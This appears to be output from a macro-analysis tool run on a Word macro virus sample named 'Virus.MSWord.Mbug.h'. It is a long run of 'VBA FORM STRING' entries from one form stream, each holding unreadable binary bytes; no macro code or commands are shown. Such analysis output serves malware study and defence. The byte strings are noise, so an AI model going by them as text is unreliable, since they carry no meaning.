VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)^%-s.D�1E�FV�Xe�`b�ew�{{�~�ψ�أ�ࣟ൯�~��ew�ew�)5k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B3.DF-=B9BB9BJBBJBBJBBB9BJBBJBBJBBOGGJBBOGGOGGZKUOGGJBBJBBJBBJBBJBBJ99JBBB9BB9B99J19J#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B99JJBJJBBJBBJBB9)99)9<.<3.+1%1=-19)9999BB9H/?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=99J99JB9BB9BB9BJ99JBBJBBOGGJBBOGGRBJRBBZKUJBBRJJRBBOGGJBBOGGOGGOGGJBBOGGOGGJJRBBR19J'&D'&D!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JJJZ^RcB9B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!R9BkVck^gkVckVcccceYVBBR#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z!1k+)�.D�1E�AK�DL�ew�~��{{қ�ǔ�޵�㵯�µ赯┠�~��ew�Xe�'1Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B)%91)B1)B<.<B9BB9BB9BB9BJBBJBBJBBJBBJBBOGGOGGOGGOGGOGGJBBZKUJBBJBBJBBJBBJBBB9BB9BB9BB9B1)B'&D'&D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!B1-X1)BB/V999OGGJBBB9BBB9999999=-13#)=-19999999)9LDD���

3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J1-X1)B<.<B9BJBBB9BJBBB9BJBBJBBJBBOGGRJJZKUOGGOGGOGGRJJOGGOGGJBBOGGOGGRJJOGGOGGN?VBBR1)B1-X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=LHkiiq9)9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZKUeYVsZckVck^gkVceYVBMk19c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N'1Y%)o%-s.D�1E�DL�FV�`b�{{Ҕ�ޔ�ޞ�֣�൯�̹䵯ⵯ┠�~��ew�ew�]i�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!B'&D1)B3.DB9BB9BJBBB9BJBBJBBJBBJBBOGGOGGOGGOGGZKURBBJBJZKURBBOGGJBBJBBJBBJBBJBBJBB9)999J1)B'&D#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J99JB9BB9BJBBJBBB9BF-=9999993.+=-11)B999F-=999D;D���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
='&D3.D99JB9BB9BB9BJ99B9BJBBJBBOGGOGGOGGOGGOGGOGGRJJOGGRJJOGGOGGJBBOGGOGGOGGOGGBBRBBR99J'&D'&D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Bt_�kVcJBB)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)OGGsZc{^c�mnskcsZcJJRLHk5:k##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z+)�%-s.?�1E�FV�FV�DL�ew�{{ң����ޣ�ࣟ൯�µ螟֣�����~��iu�ew�~��5:k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B1)B<.<JBBB9BJBBJBBJBBJBBJBBJBBOGGOGGZKUOGGOGGZKUJBBOGGJBBJBBJBBJBBJBBJBBJBBB9B99J1)B'&D#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1-X1)BB9BJBBJBBJBBJBB9)9999999=-13#)1999)9F-=B9BLDD���

3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=99J99JB9BB9BB9BJBBJBBJBBJBBJBBJBBOGGZKUOGGOGGOGGRJJOGGZKUOGGRJJOGGZKUOGGJJRBBRB/V99J#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1##X�~�kVc9)9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!sZc�������������mnJBJLY�K[�!1k##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"~%-s.?�1E�DL�N]�FV�N]�ew�~�ϣ�ࣟ൯ⵯ�̹䣟ࣟ���֔��~��~��~��iu�dt�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1)B1)B3.D9)9B9BB9BJBBJBBJBBJBBOGGOGGOGGOGGOGGOGGOGGOGGRBBZKUJBBJBBJBBJBBB9BB9BB9BB9B99J3.D'&D'&D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1)B99JB9BJBBJBBJBBJBBB9B9)9<.<=-1=-1991F-=999JBBLDD���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1-X1)B99JB9BB9BB9B9)9BB9JBBJBBJBBOGGOGGOGGOGGOGGOGGOGGOGGOGGRJJOGGOGGOGGOGGNPTBBRBBR1)B1-X1)B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)1-Xxcs99J1)BkVcҧ�ܴ�ܴ�ҧ�ҧ��~^RcLY�dt�BMk
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J##X)5k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`)5s)5s.D�&-�9L�FV�TZ�DL�Xe�`b�ew���أ�ࣟࣟ�~��~�Ϟ�֔�ޙ�۞��~��{{�~��~��5:k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B1)BB9BB9BB9BB9BJBBJBBOGGJBBJBBOGGOGGOGGOGGZKUJBBZKUOGGJBBJBBJBBJBBB9BB9B999B9J1)B1)B#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1)B1)BB9JJ9JJBBJBBJBB9)99999911%19999999999)9RBBLDD���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B99J99JB9BJ9BB9BB9BJBBB9BJBBJBBJBBOGGOGGOGGZKUJBBOGGOGGOGGOGGOGGRJJJBBOGGN?VJBJ99J1)B1-X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1)B�~����������ܴ���ɹ��[Zl]i�dt�K[�)Bo'1Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J%)o41l##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B##X!1k%-s&-�.D�1E�1E�FV�FV�FV�DL�FV�Xe�ew�ew�ew�`b�iu�{{Ҟ�֔�ޔ��~�ϔ��~�ϛ��~��fs�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B'&D1)B1)BB9JB9BJBBB9BJBBJBBJBBOGGOGGOGGOGGOGGZKUOGGOGGOGGOGGJBBJBBJBBJBBJBBB9B9)999J1)B1)B!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1)BB/V99JJBBJBBJBBB9B999999=-13#)<.<9999)9B9BJBBLDD���

3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B'&D1)B1)BB9BB9BB9BB9BJ99JBBJBBJBBJBBJBBOGGOGGZKURBBOGGOGGJBJZKUOGGOGGOGGOGGOGGZKUBBRB/V3.D1-X'&D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)XFm�����������ɧ�����dt�Xe�dt�LY�5:k!1k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N%-s'1Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)^.?�BMk!1k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N##X%-s+)�%-s.D�1E�9L�9L�DL�1E�9L�FV�FV�9L�.D�&-�9I�1E�Xe�~��~�Ϟ�֔�ވ��~��~�ϔ��~��19c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B9)9B9BB9BJBBJBBJBBJBBJBBJBBOGGOGGOGGOGGOGGOGGOGGZKUOGGJBBJBBJBBJBB9)9B9BB9B99J99J1)B#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1)B19JJ9RB9BJBBB9BB9B999999=-19)99911999)9BB9JBBLDD���

+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B3.DB9JB9BB9BB9BB9BJ99JBBJBBJBBOGGOGGOGGRBBZKURBBZKURBBOGGOGGOGGRJJOGGOGGNPTBBRBBRB/V#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)���������ܴ�������K[�xw�]i�9I�BMk
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B%-sK[�'1Y##X%-s9I�%-s##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`!1k.3~.3~.D�1E�9L�1E�9L�9L�9I�1E�%-s.3~%-s##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z+)�DL�~�ϔ�ޣ����ǔ�ޙ��~��~��fs�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B1)B99JB9BB9BJBBB9BJBBJBBJBBJBBJBBZKUOGGOGGZKURBJOGGOGGOGGOGGJBBJBBJBBJBBB9BB9B9)93.D1)B'&D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B)%9B/VB/VJBBJBBJBBB9B9)9999=-13.+9)9999999J99JBBLDD���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z)%91)B1)B<.<B9JJBB9)9B9BB9BJBBJBBJBBJBBOGGOGGZKUJBBOGGOGGRJJOGGOGGRJJOGGOGGOGGNPTJBJB/V1)B'&D#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!B=k�����ް�ʰ��Xe�dt����K[�TZ�5:k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9!1kfs�K[�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)^)BoGF�K[�!1k'1Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N##X##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c+)�.3~%-s.D�1E�1E�9L�9L�1E�%)o41l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c&-�AK�iu͔�ޞ�֔�ޔ�ޙ�۔��~�����#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B1)B9)9B9BB9BJBBJBBJBBJBBOGGOGGOGGRJJOGGOGGOGGRBBZKUZKUJBBOGGJBBJBBJBB9)9J9BB9B1)B3.D1-X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1-X1)BBBRJBBJBBJBBB9B9)99993#)3#)3.+1%19)9B9BJBBLDD���

3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=3.D99JB9BB9BB9BJBB9)9BB9JBBJBBJBBRBJZKURBBRBBZKURBBRJJOGGOGGRJJOGGRJJOGGNPTRBJBBRBBR1)B1-X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1������ӻ̌��GF����}��dt�]i�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`TZ�ew�LY�)5sFV�K[�LY�!1k##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z##X##X##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z##X%)o.3~.D�9I�&-�9L�9L�9L�.?�%)o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z+)�DL�xw�{{ң�ధʙ��~��~�ϣ����ޔ��~�Ϟ��3=T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1)B1)B9)999JB9BB9BJBBJBBJBBJBBOGGRJJOGGOGGOGGOGGZKURBBZKURBBZKUJBBJBB999B9BF-=1)B99J<.<'&D'&D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B##X1-X99JJ9RJBBJBBJBB9)99999)93.+3#)3.+3.+9)9999B9BLDD���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z'&D3.D99J1)BB9BB9B9)9B9BB9BJBBJBBJBBOGGOGGOGGZKURBBOGGOGGOGGRJJOGGOGGOGGOGGNPTZKUJBJB/V19J1-X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Jƨ����ӻ�dt�xw����}��~��B=k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
NK[�xw�~��9I�DL�]i�Xe�9I�19c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N##X##X!1k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c'1Y!1k)5s.D�1E�9L�9L�9L�1E�9I�%)o!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"~AK���ص�㞟֞�ֵ�㵯�dt�N]����������~�ϙ�۔��K[�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B'&D1)B9)93.DB9BB9BJBBJBBJBBJBBOGGOGGOGGOGGZKURBBJBBRBBZKURBBOGGJBBJBBB9B9)99)9<.<9)91)B#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!N##X1)BB9JB/VJBJJBBJBBB9B9999913.+3#)3#)9)99919)9B9BD;D���

3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B?9WB9BJBBB9BB9BB9BJBBJBBBB9JBBOGGOGGZKURBBOGGRJJOGGRJJOGGOGGRJJOGGZKUOGGJJRBBRB/V19J!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!41l޸�������ew�ƫ͌�����~��##X9I�Xe�������K[�K[�dt�fs�LY�!1k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J!1k!1k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`!1k!1k%-s,4�DL�9L�K[�AK�1E�!1k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)^+)�1E�`bǈ�؈��ew�99{!1k9I�1E�&-�N]���ޣ����֔�ޔ�ޞ��dt�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=3.D<.<B9BB9BJBBB9BJBBJBBJBBOGGOGGRBJZKURBBZKUZKUZKUJBBOGGJBBJBBJBBB9BF-=999B9B1)B1)B1)B#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J99JBBRB/VJBJJBBJBBB9B9993#)3.+3#)3.+3.+<.<999999LDD���

3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B##X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)BB9B9)9B9BB9BBB99)9B9BJBBJBBJBBJBBJBBOGGZKUOGGOGGRJJOGGOGGZKUOGGRJJOGGNPTRBJBBRBBR1-X#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Na[~޸���Ǜ��ӻ̌�����}��%)ofs�Xe����~��]i�dt����]i�LY�!1k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z!1k)5k!1k)5k%-s.D�&-�FV�9L�DL�1E�%)o'1Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"~%-s&-�9L�`b�iu�5:k)5s'1Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N&-���ص�┠�~�ϔ��~�ϣ��~��##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1)B1)B9)9B9BB9BB9BJBBB9BOGGJBBOGGOGGRBJZKUJJRZKUR9BeYVRBJJBBJBBJBBJBBBB9F-=9)9<.<1)B1)B'&D'&D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B##X1)B99JJ9RJBBJBBB9B9)99993.+3.+3#)3#))!)9)9999BB9LDD���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
